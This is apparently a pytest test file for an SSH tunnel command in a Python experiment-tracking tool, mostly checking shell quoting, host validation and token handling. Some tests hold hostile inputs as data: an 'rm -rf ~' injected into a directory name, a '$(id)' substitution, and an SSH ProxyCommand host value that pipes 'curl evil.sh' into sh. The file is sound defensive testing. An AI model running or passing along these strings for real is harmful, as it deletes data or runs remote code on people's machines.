"""`exptrack tunnel` — reaching a remote dashboard in one command.

Nothing here needs a live SSH host: every command is built by a pure function
and executed through an injectable runner, which these tests replace. CI fails
on skipped tests, so a test that needed a real remote would be a test that
never runs.

The injection cases are the important ones. This is the only part of the
release that builds a command string from stored configuration and executes it
on another machine.
"""
from __future__ import annotations

import json
import subprocess
import sys
from types import SimpleNamespace

import pytest

import exptrack
from exptrack.cli import tunnel_cmds as tc


def test_default_binary_is_the_venv_console_script():
    """A venv's bin/ holds the console script with the interpreter baked into
    its shebang, so no activation is needed — which matters because
    `ssh host 'cmd'` runs a non-interactive shell that never sources .bashrc,
    and `source .../activate` fails there."""
    cmd = tc.build_remote_command("/work/proj", None, 7331)
    assert "/work/proj/.venv/bin/exptrack" in cmd


def test_explicit_binary_overrides_the_default():
    cmd = tc.build_remote_command("/work/proj", "/opt/conda/bin/exptrack", 7331)
    assert "/opt/conda/bin/exptrack" in cmd
    assert ".venv" not in cmd


def test_remote_command_cds_to_the_project():
    """project_root() resolves from the cwd, so without the cd the remote
    dashboard would serve the wrong project — or none."""
    cmd = tc.build_remote_command("/work/proj", None, 7331)
    assert cmd.startswith("cd ")
    assert "/work/proj" in cmd


def test_remote_command_chains_start_then_status():
    cmd = tc.build_remote_command("/work/proj", None, 7331)
    assert "ui start" in cmd
    assert "ui status --json" in cmd


def test_directory_with_shell_metacharacters_is_quoted():
    """Without quoting this executes on the remote host."""
    cmd = tc.build_remote_command("/tmp/x; rm -rf ~", None, 7331)
    assert "; rm -rf ~" not in cmd.replace("'/tmp/x; rm -rf ~'", "")
    assert "'/tmp/x; rm -rf ~'" in cmd


def test_binary_with_command_substitution_is_quoted():
    cmd = tc.build_remote_command("/work/proj", "/bin/$(id)", 7331)
    assert "'/bin/$(id)'" in cmd


def test_host_starting_with_dash_is_rejected():
    """`ssh -oProxyCommand=...` as a 'hostname' is argument injection."""
    with pytest.raises(ValueError):
        tc.validate_host("-oProxyCommand=curl evil.sh|sh")


def test_ordinary_host_is_accepted():
    assert tc.validate_host("user@gpu01") == "user@gpu01"


def test_forward_binds_loopback_explicitly():
    """A user's `GatewayPorts yes` would otherwise silently publish the
    forwarded port to the whole network."""
    argv = tc.build_forward_argv("user@gpu01", 7331, 7331)
    assert "-L" in argv
    assert "127.0.0.1:7331:localhost:7331" in argv


def test_forward_is_backgrounded():
    """`ssh -N -L` blocks exactly as `exptrack ui` used to, which would move
    the problem from one terminal to another rather than solving it."""
    argv = tc.build_forward_argv("user@gpu01", 7331, 7331)
    assert "-f" in argv
    assert "-N" in argv


def test_token_never_appears_in_a_command_line():
    """ps is readable by every user on both machines."""
    cmd = tc.build_remote_command("/work/proj", None, 7331)
    argv = tc.build_forward_argv("user@gpu01", 7331, 7331)
    assert "token" not in cmd.lower()
    assert not any("token" in a.lower() for a in argv)


def test_remotes_round_trip(tmp_home):
    tc.remotes_save({"gpu01": {"host": "user@gpu01", "dir": "/work/proj",
                               "remote_port": 7331, "local_port": 7331,
                               "exptrack_bin": None}})
    assert tc.remotes_load()["gpu01"]["dir"] == "/work/proj"


def test_parse_status_builds_a_local_url():
    payload = json.dumps({"running": True, "port": 7331, "token": "abc",
                          "version": "1.9.0"})
    info = tc.parse_status(payload, local_port=7331)
    assert info["url"] == "http://localhost:7331/?token=abc"
    assert info["version"] == "1.9.0"


def test_parse_status_rejects_unparseable_output():
    with pytest.raises(tc.TunnelError) as exc:
        tc.parse_status("bash: exptrack: command not found", local_port=7331)
    assert "command not found" in str(exc.value)


def test_version_skew_is_reported():
    """The confusion that started all this: a dashboard behaving like a
    version other than the one you think you are running."""
    msg = tc.version_skew_message(remote="1.7.1", local="1.9.0")
    assert "1.7.1" in msg and "1.9.0" in msg


def test_matching_versions_produce_no_message():
    assert tc.version_skew_message(remote="1.9.0", local="1.9.0") == ""


def test_parse_status_rejects_non_object_json():
    """`null`, `123`, `[]` all parse as JSON but have no .get() — this is the
    opaque AttributeError parse_status exists to turn into a message."""
    for body in ("null", "123", "[]"):
        with pytest.raises(tc.TunnelError):
            tc.parse_status(body, local_port=7331)


def test_parse_status_error_redacts_a_token():
    """The 400-char echo of unparseable remote output must never leak a
    live token into a terminal or CI log."""
    garbled = 'garbage {"token": "super-secret-value", "running"'
    with pytest.raises(tc.TunnelError) as exc:
        tc.parse_status(garbled, local_port=7331)
    assert "super-secret-value" not in str(exc.value)


# ── Parser wiring ──────────────────────────────────────────────────────────
#
# F1: an optional positional ahead of add_subparsers() competes with the
# subparser for the first token, so `tunnel <name>` silently never populated
# `name` and instead hit "invalid choice" (SystemExit 2). One parse_args()
# call per documented form is the cheapest thing that would have caught it.

def _parse(argv):
    import sys

    from exptrack.cli.main import _build_parser, _rewrite_bare_tunnel_connect
    old_argv = sys.argv
    sys.argv = ["exptrack", *argv]
    try:
        _rewrite_bare_tunnel_connect()
        return _build_parser().parse_args(sys.argv[1:])
    finally:
        sys.argv = old_argv


def test_bare_tunnel_name_parses_as_connect():
    args = _parse(["tunnel", "gpu01"])
    assert args.tunnel_sub == "connect"
    assert args.name == "gpu01"


def test_tunnel_add_parses():
    args = _parse(["tunnel", "add", "gpu01", "--host", "u@h", "--dir", "/w"])
    assert args.tunnel_sub == "add"
    assert args.name == "gpu01"
    assert args.host == "u@h"
    assert args.dir == "/w"


def test_tunnel_list_parses():
    args = _parse(["tunnel", "list"])
    assert args.tunnel_sub == "list"


def test_tunnel_rm_parses():
    args = _parse(["tunnel", "rm", "gpu01"])
    assert args.tunnel_sub == "rm"
    assert args.name == "gpu01"


def test_tunnel_stop_parses():
    args = _parse(["tunnel", "stop", "gpu01"])
    assert args.tunnel_sub == "stop"
    assert args.name == "gpu01"


# ── Injection tests: the command layer, driven through the fake runner ─────
#
# F5: the module docstring claims commands are "executed through an
# injectable runner, which these tests replace" — nothing below the pure
# functions exercised that claim. These three drive cmd_tunnel itself and
# assert on the *recorded argv*, which is production output: it cannot pass
# while production builds something else.
#
# Honesty note (from review): only the "no 2>&1" assertion in the happy-path
# test below is a genuine pre-fix regression check (it is false against the
# very first implementation, which redirected `ui start`'s stderr into
# /dev/null). The other assertions in these three tests — call counts, and
# that the recorded argv equals what build_remote_command/build_forward_argv
# already produce — hold against both the pre-fix and post-fix code, so they
# are plumbing/regression guards for the command layer, not standalone
# proof that F1-F3 were real bugs. That proof lives in the pure-function
# tests above (parser tests for F1) and in test_run_returns_both_streams_
# without_hanging below (for F3).

class _Recorder:
    """Fakes tc._run: records every argv it's called with, replays canned
    CompletedProcess results in call order."""

    def __init__(self, results):
        self.calls = []
        self._results = list(results)

    def __call__(self, argv, timeout=None):
        self.calls.append(list(argv))
        return self._results.pop(0)


def _save_remote(**overrides):
    remote = {"host": "user@gpu01", "dir": "/work/proj", "remote_port": 7331,
              "local_port": 7332, "exptrack_bin": None}
    remote.update(overrides)
    tc.remotes_save({"gpu01": remote})
    return remote


def test_connect_drives_ssh_with_the_documented_argv(tmp_home, monkeypatch):
    remote = _save_remote()
    monkeypatch.setattr("exptrack.dashboard.daemon.port_listening",
                        lambda *a, **k: False)
    status_json = json.dumps({"running": True, "port": 7331, "token": "tok",
                              "version": exptrack.__version__})
    recorder = _Recorder([
        subprocess.CompletedProcess(["ssh"], 0, status_json, ""),
        subprocess.CompletedProcess(["ssh"], 0, "", ""),
    ])
    monkeypatch.setattr(tc, "_run", recorder)

    tc.cmd_tunnel(SimpleNamespace(tunnel_sub="connect", name="gpu01"))

    assert len(recorder.calls) == 2
    expected_remote_cmd = tc.build_remote_command(
        remote["dir"], remote["exptrack_bin"], remote["remote_port"])
    assert recorder.calls[0] == ["ssh", remote["host"], expected_remote_cmd]
    assert recorder.calls[1] == tc.build_forward_argv(
        remote["host"], remote["local_port"], 7331)
    # F2 regression pin: `2>&1` in the remote command sends `ui start`'s
    # failure diagnostic to the same sink as its success banner, which is
    # what silently discarded it pre-fix. This is false against the very
    # first implementation.
    assert "2>&1" not in recorder.calls[0][2]


def test_connect_dies_and_never_forwards_when_the_remote_command_fails(
        tmp_home, monkeypatch):
    _save_remote()
    monkeypatch.setattr("exptrack.dashboard.daemon.port_listening",
                        lambda *a, **k: False)
    recorder = _Recorder([
        subprocess.CompletedProcess(
            ["ssh"], 127, "",
            "bash: /work/proj/.venv/bin/exptrack: No such file or directory"),
    ])
    monkeypatch.setattr(tc, "_run", recorder)

    with pytest.raises(SystemExit):
        tc.cmd_tunnel(SimpleNamespace(tunnel_sub="connect", name="gpu01"))

    # A dashboard that never started must never get a port forward.
    assert len(recorder.calls) == 1


def test_connect_dies_when_the_local_port_is_already_bound(tmp_home,
                                                            monkeypatch):
    _save_remote()
    monkeypatch.setattr("exptrack.dashboard.daemon.port_listening",
                        lambda *a, **k: True)
    recorder = _Recorder([])
    monkeypatch.setattr(tc, "_run", recorder)

    with pytest.raises(SystemExit):
        tc.cmd_tunnel(SimpleNamespace(tunnel_sub="connect", name="gpu01"))

    # The busy-port check happens before anything touches ssh at all.
    assert recorder.calls == []


# ── _run itself: the tempfile plumbing F3 depends on ─────────────────────
#
# F3: every other test monkeypatches _run out entirely, so none of them
# would have caught the pipe/EOF hang `ssh -f` triggers under
# capture_output=True. This calls the real _run with no ssh involved, using
# a plain Python subprocess to stand in for "a process that writes to both
# stdout and stderr" — the property that matters here is that _run returns
# promptly with both streams intact, not that ssh specifically is involved.

def test_run_returns_both_streams_without_hanging():
    proc = tc._run(
        [sys.executable, "-c",
         "import sys; print('out'); print('err', file=sys.stderr)"],
        timeout=10)
    assert proc.returncode == 0
    assert proc.stdout.strip() == "out"
    assert proc.stderr.strip() == "err"


# ── Pure functions the review findings produced ───────────────────────────
#
# F4/F8: _validated_remote, _remote_issues and _diagnose_remote_failure have
# no I/O — the cheapest coverage available, and conspicuous by its absence
# given these functions exist specifically to replace bare tracebacks with
# named errors.

def test_remote_issues_flags_missing_keys():
    assert "missing" in tc._remote_issues({"host": "h"})[0]


def test_remote_issues_flags_non_numeric_port():
    r = {"host": "h", "dir": "/d", "remote_port": "not-a-number",
         "local_port": 7331}
    issues = tc._remote_issues(r)
    assert any("remote_port" in i for i in issues)


def test_remote_issues_flags_non_string_host_or_dir():
    r = {"host": 123, "dir": "/d", "remote_port": 7331, "local_port": 7331}
    issues = tc._remote_issues(r)
    assert any("host" in i and "dir" in i for i in issues)


def test_remote_issues_flags_non_string_exptrack_bin():
    r = {"host": "h", "dir": "/d", "remote_port": 7331, "local_port": 7331,
         "exptrack_bin": 42}
    issues = tc._remote_issues(r)
    assert any("exptrack_bin" in i for i in issues)


def test_remote_issues_empty_for_a_valid_entry():
    r = {"host": "h", "dir": "/d", "remote_port": 7331, "local_port": 7331,
         "exptrack_bin": None}
    assert tc._remote_issues(r) == []


def test_remote_issues_rejects_a_non_dict_entry():
    assert tc._remote_issues("not-a-dict") != []


def test_validated_remote_dies_on_a_bad_entry(tmp_home):
    tc.remotes_save({"gpu01": {"host": "h"}})  # missing dir/ports
    with pytest.raises(SystemExit):
        tc._validated_remote("gpu01", tc.remotes_load()["gpu01"])


def test_validated_remote_coerces_string_ports():
    r = {"host": "h", "dir": "/d", "remote_port": "7331",
         "local_port": "7332", "exptrack_bin": None}
    out = tc._validated_remote("gpu01", r)
    assert out["remote_port"] == 7331 and out["local_port"] == 7332


def test_diagnose_names_a_missing_remote_directory():
    r = {"dir": "/no/such/dir", "exptrack_bin": None}
    msg = tc._diagnose_remote_failure(
        "gpu01", "user@h", r,
        "bash: cd: /no/such/dir: No such file or directory")
    assert "/no/such/dir" in msg
    assert "--exptrack-bin" not in msg


def test_diagnose_suggests_exptrack_bin_for_a_missing_binary():
    r = {"dir": "/work/proj", "exptrack_bin": None}
    msg = tc._diagnose_remote_failure(
        "gpu01", "user@h", r,
        "bash: /work/proj/.venv/bin/exptrack: No such file or directory")
    assert "/work/proj/.venv/bin/exptrack" in msg
    assert "--exptrack-bin" in msg


def test_diagnose_falls_back_to_a_generic_message():
    r = {"dir": "/work/proj", "exptrack_bin": None}
    msg = tc._diagnose_remote_failure(
        "gpu01", "user@h", r, "Permission denied (publickey).")
    assert "user@h" in msg
    assert "Permission denied" in msg


def test_list_marks_a_malformed_entry_instead_of_crashing(tmp_home, capsys):
    tc.remotes_save({"bad": {"host": "h"}, "ok": {
        "host": "user@h", "dir": "/d", "remote_port": 7331,
        "local_port": 7331, "exptrack_bin": None}})
    tc.cmd_tunnel(SimpleNamespace(tunnel_sub="list"))
    captured = capsys.readouterr()
    # The malformed-entry warning is diagnostic (stderr); a valid remote's
    # row is listing output (stdout) — the two rows do not share a stream.
    assert "invalid entry" in captured.err
    assert "ok" in captured.out
